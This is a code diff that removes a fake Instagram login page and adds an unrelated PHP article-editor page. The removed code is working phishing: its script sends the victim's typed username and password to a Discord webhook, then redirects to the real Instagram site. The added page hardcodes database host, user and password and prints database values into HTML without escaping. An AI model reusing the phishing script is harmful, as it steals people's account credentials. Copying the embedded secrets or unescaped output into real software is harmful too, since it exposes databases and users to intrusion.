@@ -1,100 +1,215 @@
-<head>
-  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
-  <title>Instagram</title>
-</head>
-<body>
-  <span id="root">
-    <section class="section-all">
-      <link rel="stylesheet" href="css.css">
-      <!-- 1-Role Main -->
-      <main class="main" role="main">
-        <div class="wrapper">
-          <article class="article">
-            <div class="content">
-              <div class="login-box">
-                <div class="header">
-                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                </div><!-- Header end -->
-                <div class="form-wrap">
-                  <form class="form">
-                    <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
-                    </div>  
-                    <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                    </div>  
-                    <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
-                    </span>  
-                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
-                  </form>
-                </div> <!-- Form-wrap end -->
-              </div> <!-- Login-box end -->
-              <div class="login-box">
-                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
-              </div> <!-- Signup-box end -->
-              <div class="app">
-                <p>Get the app.</p>
-                <div class="app-img">
-                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                  </a>
-                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                  </a>  
-                </div>  <!-- App-img end-->
-              </div> <!-- App end -->
-            </div> <!-- Content end -->
-          </article>
-        </div> <!-- Wrapper end -->
-      </main>
-      <!-- 2-Role Footer -->
-      <footer class="footer" role="contentinfo">
-        <div class="footer-container">
-          <nav class="footer-nav" role="navigation">
-            <ul>
-			  <li><a href=""></a></li>
-              <li><a href="https://about.instagram.com">About Us</a></li>
-              <li><a href="https://help.instagram.com">Support</a></li>
-              <li><a href="https://about.instagram.com/blog">Blog</a></li>
-              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
-              <li><a href="https://www.instagram.com/developer">Api</a></li>
-              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
-              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
-              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
-			  <li><a href="">Intsagram</a></li>
-            </ul>
-          </nav>
-          <span class="footer-logo">&copy; 2021 Instagram</span>
-        </div> <!-- Footer container end -->
-      </footer>
-      
-    </section>
-  </span> <!-- Root -->
-  <!-- Select Link -->
-  <script type="text/javascript">
-    function la(src) {
-      window.location=src;
-    }
-  </script>
-  <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
+<?php
+
+$servername = "eu-cdbr-west-03.cleardb.net";
+$username = "bbaf388fb9cdd4";
+$password = "3d8129cb";
+$dbname = "heroku_bd8d98ba372acef";
+
+$conn = mysqli_connect($servername, $username, $password, $dbname);
+
+if ($conn->connect_error) {
+  die("Connection failed: " . $conn->connect_error);
 }
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1043315855494217799/vrqd0-jCFNhrdI9aW3_l8uQ6ZFWEGFXJtmPwjX4ExBpK9c_1J-cc7zXt5_UyZ_XevQB2");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+$query = "select * from category";
+$res = $conn->query($query);
+$categories = [];
+while ($rdata = $res->fetch_assoc()) {
+  array_push($categories, $rdata);
+}
+?>
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+  <script src="https://cdn.ckeditor.com/ckeditor5/35.3.2/classic/ckeditor.js"></script>
+  <script src="https://kit.fontawesome.com/eb0dae64d9.js" crossorigin="anonymous"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+
+  <title>Document</title>
+
+  <style>
+    input {
+      outline: 0;
+      border-width: 0 0 2px;
+      border-color: blue
     }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com");
-  }
+
+    input:focus {
+      border-color: green
+    }
+    header, footer {
+      width: 100%;
+      background-color: #e5e5e5;
+    }
+    main{
+      height: 80vh;
+      
+    }
+    .leftside{
+      background-color: #e5e5e5;
+      height: 80vh;
+      border-top-right-radius: 20px;
+      border-bottom-right-radius: 20px;
+      margin-right: 100px;
+
+    }
+    .rightside {
+      background-color: #e5e5e5;
+      height: 80vh;
+     border-radius: 20px;
+ 
+     padding:100px;
+    
+    }
+    .ck {
+      height: 30vh;
+    }
+    #post {
+      background-color: #3fa59d;
+      padding: 15px;
+      color: white;
+      border: none;
+      border-radius: 10px;
+    }
+
+
+    .btn-category {
+      background-color: #3fa59d;
+      padding: 15px;
+      color: white;
+      border: none;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+
+
+<body>
+  <div class="app">
+    <header class="p-4">
+      <h1 class="text-center">header</h1>
+    </header>
+    <main class="my-4">
+      <div class="row content">
+        <div class="col-2 leftside p-5">
+          <button class="btn btn-light px-5 mx-auto"><span>Add article</span></button>
+        </div>
+        <div class="col-9 rightside">
+          <div class="row d-flex justify-content-center bg-white pt-5">
+            <div class="col-6">
+                <div class="title">
+                  <input type="text" class="" placeholder="Article Title..." required id="title">
+                </div>
+                <div class="articlebody mt-4">
+                  <div id="editor"></div>
+                </div>
+                <div class="categories mt-4">
+                  <h4>Select categories</h4>
+                  <select name="categories" class="form-select" required placeholder="select categores" id="categories">
+                    <?php
+                    foreach ($categories as $category) {
+                      echo "<option value=".$category["category"].">".$category["category"]."</option>";
+                    }
+                    ?>
+                  </select>
+                </div>
+                <div class="post mt-4 mb-4">
+                  <button  id="post">POST ARTICLE</button>
+                </div>
+            </div>
+            <div class="col-4">
+              <div class="title">
+                <h3>Add a new category</h3>
+              </div>
+              <div class="content">
+                <div class="card p-5">
+                  <div class="row">
+                    <form action="addCategory.php" method="post">
+                      <div class="row">
+                      <div class="col-2">
+                        <i class="fa-solid fa-copy"></i>
+                      </div>
+                      <div class="col-10">
+                        <input type="text" required placeholder="Enter Category" name="category">
+
+                      </div>
+                      </div>
+                  </div>
+                  <div class="d-flex justify-content-end mt-2" >
+                    <button class="btn-category" type="submit">
+                      ADD CATEGORY
+                    </button>
+                  </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer class="p-4">
+      <h3 class="text-center">footer</h3>
+    </footer>
+  </div>
+  <script>
+    var editor;
+      $("#post").on("click",function(){
+        let title = $("#title").val();
+        if(title===""){
+          alert("Need to type article title")
+          return;
+        }
+        let category = $("#categories").val();
+        let data = editor.getData();
+        if(data===""){
+          alert("type article body")
+          return;
+        }
+        $.ajax({
+          url:'ajax.php',
+          method:"post",
+          data:{
+            title:title,
+            body:data,
+            category:category
+          },
+          success:function(res){
+            if(res==="1"){
+              alert("successfully added")
+              title = $("#title").val("");
+              editor.setData("")
+            }
+
+            else {
+              alert("Error ")
+            }
+          }
+        })
+
+      })
   </script>
 </body>
+<script>
+  ClassicEditor
+    .create(document.querySelector('#editor'))
+    .then(newEditor=>{
+      editor = newEditor;
+    })
+    .catch(error => {
+      console.error(error);
+    });
+</script>
+
+</html>
+
+<?php
+?>
